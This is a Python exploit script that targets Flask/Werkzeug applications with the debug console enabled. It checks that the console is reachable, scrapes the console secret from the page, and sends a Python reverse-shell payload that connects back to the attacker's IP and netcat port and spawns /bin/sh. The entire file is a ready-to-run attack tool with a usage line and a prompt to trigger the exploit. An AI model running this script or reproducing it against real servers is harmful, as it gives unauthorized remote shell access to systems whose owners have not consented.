#!/usr/bin/env python
import requests
import sys
import re
import urllib

# usage : python exploit.py 192.168.56.101 5000 192.168.56.102 4422

if len(sys.argv) != 5:
    print "USAGE: python %s <ip> <port> <your ip> <netcat port>" % (sys.argv[0])
    sys.exit(-1)


response = requests.get('http://%s:%s/console' % (sys.argv[1],sys.argv[2]))

if "Werkzeug " not in response.text:
    print "[-] Debug is not enabled"
    sys.exit(-1)

# since the application or debugger about python using python for reverse connect
cmd = '''import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);''' % (sys.argv[3],sys.argv[4])

__debugger__ = 'yes'

frm = '0'

response = requests.get('http://%s:%s/console' % (sys.argv[1],sys.argv[2]))

secret = re.findall("[0-9a-zA-Z]{20}",response.text)

if len(secret) != 1:
    print "[-] Impossible to get SECRET"
    sys.exit(-1)
else:
    secret = secret[0]
    print "[+] SECRET is: "+str(secret)

# shell
print "[+] Sending reverse shell to %s:%s, please  use netcat listening in %s:%s" % (sys.argv[1],sys.argv[2],sys.argv[3],sys.argv[4])

raw_input("PRESS ENTER TO EXPLOIT")

data = {
        '__debugger__' : __debugger__,
        'cmd' : str(cmd),
        'frm' : frm,
        's' : secret
        }


response = requests.get("http://%s:%s/console" % (sys.argv[1],sys.argv[2]), params=data,headers=response.headers)

print "[+] response from server"
print "status code: " + str(response.status_code)
print "response: "+ str(response.text)